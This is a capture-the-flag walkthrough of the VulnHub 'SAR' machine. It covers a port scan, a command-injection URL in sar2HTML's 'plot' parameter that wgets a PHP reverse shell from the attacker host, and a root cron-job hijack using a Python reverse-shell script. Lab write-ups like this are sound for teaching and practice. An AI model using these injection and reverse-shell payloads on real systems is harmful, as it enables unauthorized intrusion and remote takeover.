# SAR - VulnHub Machine

Linux 5.0.0 sar 18.04 Ubuntu x64
## Nmap Port Scan

```
# Nmap 7.91 scan initiated Fri Nov 20 15:35:38 2020 as: nmap -sV -sC -p- -T4 -oA allports.sV.sC 10.1.63.5
Nmap scan report for 10.1.63.5
Host is up (0.00016s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

## SAR2HTML - RCE Exploit

The SAR2HTML application is vulnerable to an RCE exploit through the index.php *plot* parameter. 

Upload PentestMonkey PHP reverse shell using the following URL:

>http://10.1.63.5/sar2HTML/index.php?plot=;wget%2010.1.63.42/rev4242.php

We can then setup a listener on nc and navigate to the backdoor. 

## User.txt
```
www-data@sar:/home/love/Desktop$ cat user.txt 
427a7e47deb4a8649c7cab38df232b52
```

## Priv Esc

Linpeas revealed two *.sh* files inside */var/www/html*, which are being run by a cron job executed by root. 

>*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh

The following script executes a reverse shell if placed inside */var/www/html* instead of the original *write.sh*.

```
#!/usr/bin/env python3

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.1.63.42",4240))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
We catch the shell using nc and read the root flag. 

>nc -nlvp 4240

```
root@sar:~# cat root.txt
cat root.txt
66f93d6b2ca96c9ad78a8a9ba0008e99
```




